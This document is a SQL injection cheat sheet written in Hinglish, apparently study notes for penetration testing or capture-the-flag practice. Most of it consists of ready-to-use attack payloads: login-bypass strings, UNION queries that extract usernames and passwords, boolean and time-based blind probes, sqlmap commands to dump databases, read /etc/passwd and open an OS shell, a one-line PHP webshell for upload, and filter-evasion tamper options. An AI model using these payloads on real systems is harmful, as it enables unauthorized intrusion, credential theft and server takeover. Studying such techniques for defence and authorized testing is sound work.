# SQL INJECTION — Manual + SQLMap

---

## Pehle Samjho: SQL Injection Kya Hai?

Socho ek login page hai jahan tum username aur password daaltey ho.
Backend mein ye query chalti hai:
```sql
SELECT * FROM users WHERE username = 'TUMHARA_INPUT' AND password = 'TUMHARA_PASS';
```
Ab agar tum username mein ye daal do: `admin' --`
Toh query ban jaayegi:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '';
```
`--` ke baad sab COMMENT ho gaya! Password check hi nahi hua!
Yehi hai SQL Injection — tum apni SQL query inject kar rahe ho application ke through.

**Kab hota hai?** Jab application user input ko directly SQL query mein daalti hai bina sanitize kiye.

---

## SQL Injection Ke Types — Samjho Ache Se

| Type | Kaise Kaam Karta Hai | Kaise Pehchano |
|---|---|---|
| **Union-Based** | UNION SELECT se doosri table ka data nikalo | Page pe extra data dikhta hai |
| **Error-Based** | Database error se information leak hoti hai | Error messages dikhte hain page pe |
| **Boolean Blind** | True/false response se data guess karo | Page content change hota hai (haan/nahi) |
| **Time-Based Blind** | sleep() se response time check karo | Page load slow hota hai = TRUE |

---

## CASE 1: Manual SQL Injection — Login Bypass

```sql
# Username field mein try karo:
admin' --
admin' #
' OR 1=1 --
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' #
admin' OR '1'='1
```
**Kya expect karo:** Login ho jaayega bina password ke. Agar "Welcome admin" dikhe = SQLi work kar raha hai.

**Password field mein bhi try kar sakte ho:**
```sql
' OR 1=1 --
```

---

## CASE 2: Union-Based SQLi — Data Nikalo

**Step 1: Column count pata karo**
```sql
' ORDER BY 1 --       (works)
' ORDER BY 2 --       (works)
' ORDER BY 3 --       (works)
' ORDER BY 4 --       (ERROR! matlab 3 columns hain)
```

**Step 2: Union SELECT karo**
```sql
' UNION SELECT 1,2,3 --
```
Page pe koi number dikhega (jaise 2) — wahi column injectable hai.

**Step 3: Database info nikalo**
```sql
' UNION SELECT 1,database(),3 --                    # Current DB name
' UNION SELECT 1,version(),3 --                     # DB version
' UNION SELECT 1,user(),3 --                        # Current DB user
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users' --
' UNION SELECT 1,group_concat(username,':',password),3 FROM users --
```

---

## CASE 3: SQLMap — GET Request

```bash
# Basic GET parameter injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
# --dbs = sabhi databases list karo

# Specific database ki tables
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# Specific table ke columns
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --columns

# Data DUMP karo
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
```

**Enumeration Flow yaad rakho:** `--dbs` → `--tables` → `--columns` → `--dump`

---

## CASE 4: SQLMap — POST Request (Login Form)

```bash
# Burp se request capture karo, save as req.txt, phir:
sqlmap -r req.txt --dbs

# Ya directly POST data do:
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" --dbs

# Specific parameter test karo:
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test" -p username --dbs
```

---

## CASE 5: SQLMap — Cookie Based Injection

```bash
sqlmap -u "http://target.com/dashboard.php" --cookie="session=abc123; user=1" --level=2 --dbs
# --level=2 ya upar cookies bhi test karta hai
```

---

## CASE 6: Advanced SQLMap — OS Shell / File Read / Write

```bash
# OS Shell lena (MySQL root + file privileges chahiye)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# File read karo server se
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Webshell upload karo
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

**shell.php banao pehle locally:**
```php
<?php system($_GET['cmd']); ?>
```

---

## CASE 7: Blind SQLi — Boolean Based (Manual)

```sql
# True condition (normal page load)
' AND 1=1 --

# False condition (page different/empty)
' AND 1=2 --

# Agar dono mein difference hai = Boolean Blind SQLi possible!

# Database name ka pehla character guess karo:
' AND SUBSTRING(database(),1,1)='a' --
' AND SUBSTRING(database(),1,1)='b' --
# Jab page normal aaye = sahi character mila
```

---

## CASE 8: Blind SQLi — Time Based (Manual)

```sql
# Agar page pe koi visible change nahi
' AND SLEEP(5) --
# 5 second delay aaya? = Injectable hai!

' AND IF(SUBSTRING(database(),1,1)='a', SLEEP(5), 0) --
# 5 sec delay = pehla character 'a' hai
```

---

## CASE 9: WAF Bypass / Tamper Scripts

```bash
# SQLMap tamper scripts use karo:
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment --dbs
sqlmap -u "http://target.com/page.php?id=1" --tamper=between,randomcase --dbs

# Common tamper scripts:
# space2comment    → spaces ko /**/ se replace
# between          → > ko BETWEEN se replace
# randomcase       → SeLeCt jaise random case
# charencode       → URL encode characters
# equaltolike      → = ko LIKE se replace
```

**Manual WAF bypass payloads:**
```sql
'/**/OR/**/1=1--                    # space ke jagah comments
' /*!UNION*/ /*!SELECT*/ 1,2,3--   # MySQL version comments
' uNiOn SeLeCt 1,2,3--             # case mixing
```

---

## Common Mistakes (Mat Karna Ye)

1. **Comment syntax galat:** MySQL mein `--` ke baad SPACE chahiye (`-- `), ya `#` use karo
2. **Column count match nahi:** UNION SELECT mein column count original query se match hona chahiye
3. **SQLMap mein URL galat:** Parameter hona chahiye URL mein (`?id=1`), warna `-p` specify karo
4. **POST request mein `--data` bhool gaye:** POST form ke liye `--data` ya `-r req.txt` zaruri hai
5. **Blind SQLi mein impatient:** Time-based slow hota hai, patience rakho
6. **Quotes match nahi:** Agar application single quote use karti hai toh `'` se start karo, double quote hai toh `"`

---

## Quick Decision Tree

```
SQL Injection suspect?
  │
  ├─ Login page hai?
  │    └─ admin' -- ya ' OR 1=1 -- try karo
  │
  ├─ URL mein parameter hai (id=1)?
  │    ├─ Page pe data dikhta hai? → Union-Based try karo
  │    ├─ Error message dikhta hai? → Error-Based
  │    ├─ Page change hota hai true/false se? → Boolean Blind
  │    └─ Kuch nahi dikhta? → Time-Based (SLEEP)
  │
  ├─ SQLMap use karna hai?
  │    ├─ GET: sqlmap -u "URL?param=value" --dbs
  │    ├─ POST: sqlmap -r request.txt --dbs
  │    └─ Flow: --dbs → --tables → --columns → --dump
  │
  ├─ WAF/Filter hai?
  │    └─ --tamper scripts use karo
  │
  └─ Shell chahiye?
       └─ --os-shell ya --file-write se webshell upload
```
